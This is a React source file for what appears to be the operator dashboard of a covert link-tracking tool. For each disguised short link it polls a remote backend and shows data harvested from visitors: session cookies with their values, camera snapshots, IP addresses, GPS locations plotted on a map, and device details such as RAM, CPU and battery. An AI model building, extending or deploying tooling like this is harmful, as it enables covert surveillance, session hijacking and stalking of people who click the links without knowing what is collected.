import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";

export default function AdminPanel() {
  const { shortId } = useParams();

  const [stats, setStats] = useState([]);
  const [selectedShortId, setSelectedShortId] = useState(null);
  const [selectedVisitor, setSelectedVisitor] = useState(null);
  const [cookieData, setCookieData] = useState([]);
  const [selectedCookies, setSelectedCookies] = useState(null); // ✅ NEW

  useEffect(() => {
    const fetchData = () => {
      const token = localStorage.getItem("token");

      fetch(`https://user-tracking-1.onrender.com/api/auth/analytics/${shortId}`, {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      })
        .then((res) => res.json())
        .then((data) => {
          if (data.logs) {
            setStats(data.logs);
            setCookieData(data.logs); // ✅ Store all cookie data
          }

        })
        .catch((err) => console.error("Error fetching data:", err));
    };

    const interval = setInterval(fetchData, 1000);
    return () => clearInterval(interval);
  }, [shortId]);

  const activeEntry = stats.find((item) => item.shortId === selectedShortId);
  const visitorLogs = activeEntry ? activeEntry.analytics : [];
  const EntryCookies = cookieData.find((item) => item.shortId === selectedCookies); // ✅ fix 1
  const cookiesForSelected = EntryCookies ? EntryCookies.cookies : [];
  return (
    <div className="admin-container">
      <h1>Admin Dashboard</h1>

      <div className="table-container">
        <table
          border="1"
          width="100%"
          style={{ borderCollapse: "collapse", textAlign: "left" }}
        >
          <thead>
            <tr>
              <th>Tracking URL</th>
              <th>Destination URL</th>
              <th>Cookies</th>
              <th>Visitors Count</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody>
            {stats.length > 0 ? (
              stats.map((item, index) => (
                <tr key={index}>
                  <td>{`https://user-tracking-six.vercel.app/t/${item.shortId}`}</td>
                  <td>{item.destinationUrl}</td>
                  <td>
                    <button
                      className="button2"
                      onClick={() => setSelectedCookies(item.shortId)}
                    >
                      View Cookies
                    </button>
                  </td>
                  <td>{item.clicks}</td>
                  <td>
                    <button
                      className="button2"
                      onClick={() => {
                        setSelectedShortId(item.shortId);
                        setSelectedVisitor(null);
                      }}
                    >
                      {selectedShortId === item.shortId
                        ? "Viewing..."
                        : "View Details"}
                    </button>
                  </td>
                </tr>
              ))
            ) : (
              <tr>
                <td colSpan="5" style={{ textAlign: "center", padding: "10px" }}>
                  no tracking url found
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>


      {/* ✅ COOKIE MODAL */}
      {selectedCookies && cookiesForSelected && ( // ✅ fix 3
        <div className="modal-overlay1">
          <div className="modal-content1">
            <div style={{ display: "flex", justifyContent: "space-between" }}>
              <h3>Cookie</h3>
              <button className="close" onClick={() => setSelectedCookies(null)}>✕</button> {/* ✅ fix 2 */}
            </div>
            <hr />

            {cookiesForSelected.length > 0 ? (
              cookiesForSelected.map((session, i) => (
                <div key={i}>
                  <p className="cookie-session">
                    <b>Cookie Data</b>{" "}

                  </p>

                  {session.cookies.map((c, j) => (
                    <div key={j}>
                      <p><b>Name:</b> {c.key || c.name}</p>
                      <p><b>Value:</b> {c.value}</p>
                      <p><b>Domain:</b> {c.domain}</p>
                      <p><b>Path:</b> {c.path}</p>
                      <hr />
                    </div>
                  ))}
                  <hr />
                </div>
              ))
            ) : (
              <p>No cookies found</p>
            )}
          </div>
        </div>
      )}

      {selectedShortId && (
        <div className="user-details">
          <div style={{ display: "flex", justifyContent: "right", alignItems: "center" }}>
            <button className="close" onClick={() => setSelectedShortId(null)}>✕</button>
          </div>
          <div className="log row py-5">
            {visitorLogs.length > 0 ? (
              visitorLogs.map((log, index) => (
                <div key={index} className="device-box col-md-8">
                  <div>
                    {log.cameraImage ? (
                      <img src={log.cameraImage} alt="User" width="150" />
                    ) : (
                      <p>No Image Captured</p>
                    )}
                    <p><b>IP:</b> {log.ip}</p>
                    <div className="bettery">
                      <p>{log.batteryLevel}</p>
                    </div>
                    <div className="time">
                      <p>{new Date(log.timestamp).toLocaleTimeString("en-GB")}</p>
                      <br />
                      <p>{new Date(log.timestamp).toLocaleDateString("en-GB")}</p>
                    </div>
                    <button className="button1" onClick={() => setSelectedVisitor(log)}>
                      View
                    </button>
                  </div>
                </div>
              ))
            ) : (
              <p>No visitor logs found for this specific tracking URL.</p>
            )}
          </div>

          {selectedVisitor && (
            <div className="modal-overlay">
              <div className="modal-content">
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <h3>Visitor Details</h3>
                  <button onClick={() => setSelectedVisitor(null)} className="close-btn">✕</button>
                </div>
                <hr />
                <div style={{ textAlign: "left", marginTop: "15px" }}>
                  <h4>Device Info</h4>
                  <p><b>IP:</b> {selectedVisitor.ip}</p>
                  <p><b>Browser:</b> {selectedVisitor.browser}</p>
                  <p><b>Platform:</b> {selectedVisitor.platform}</p>
                  <p><b>Screen:</b> {selectedVisitor.screen}</p>
                  <p><b>RAM:</b> {selectedVisitor.ram} GB</p>
                  <p><b>CPU:</b> {selectedVisitor.cpuCores} Cores</p>
                  <p>
                    <b>Battery:</b> {selectedVisitor.batteryLevel}(
                    {selectedVisitor.isCharging ? "Charging" : "Unplugged"})
                  </p>
                  <p>
                    <b>Captured At:</b>{" "}
                    {new Date(selectedVisitor.timestamp).toLocaleString()}
                  </p>
                </div>

                <h4 style={{ textAlign: "left", marginTop: "20px" }}>Location Map</h4>
                {selectedVisitor.latitude && selectedVisitor.longitude ? (
                  <iframe
                    title="visitor-location"
                    width="100%"
                    height="450"
                    /* ✅ React માં style આ રીતે લખાય */
                    style={{ border: 0, borderRadius: "8px" }}
                    src={`https://maps.google.com/maps?q=${selectedVisitor.latitude},${selectedVisitor.longitude}&z=15&output=embed`}
                     
                    allowFullScreen={true}
                    loading="lazy"
                    referrerPolicy="no-referrer-when-downgrade"
                  ></iframe>
                ) : (
                  <p>Location data not available for this visitor.</p>
                )}
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}